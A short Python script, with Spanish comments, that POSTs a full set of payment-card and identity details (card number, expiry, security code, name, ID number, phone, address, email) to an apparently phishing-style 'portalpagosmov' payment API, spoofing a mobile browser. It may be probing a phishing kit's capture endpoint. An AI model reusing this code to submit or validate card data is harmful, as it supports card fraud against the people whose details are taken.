import requests

url = "https://portalpagosmov.com/api/api.php?a=nu"   # <--- cámbialo por tu endpoint de práctica

headers = {
    "Host": "portalpagosmov.com",
    "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://portalpagosmov.com",
}

data = {
    "ttcc": "4824 5146 6477 7436",
    "bk_name": "BANCO COMERCIAL AV VILLAS, S.A.",
    "cname": "Eduarda Onwubiko",
    "cmexp": "12",
    "cyexp": "2027",
    "csc": "180",
    "cc": "1111111111",
    "tel": "3152212196",
    "city": "Cali",
    "address": "R Cruzes 88",
    "mail": "sillatarrogo@gmial.com",
    "uuid": "40363450831",
    "booking": "aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXkucGhwP2RhdGE9dGVzdA==",  # ejemplo seguro
    "u": "",
    "p": ""
}

try:
    resp = requests.post(url, headers=headers, data=data)
    print("Status:", resp.status_code)
    print("\n=== HEADERS ===")
    for k, v in resp.headers.items():
        print(f"{k}: {v}")
    print("\n=== BODY ===")
    print(resp.text)
except requests.exceptions.RequestException as e:
    print("Error en la petición:", e)
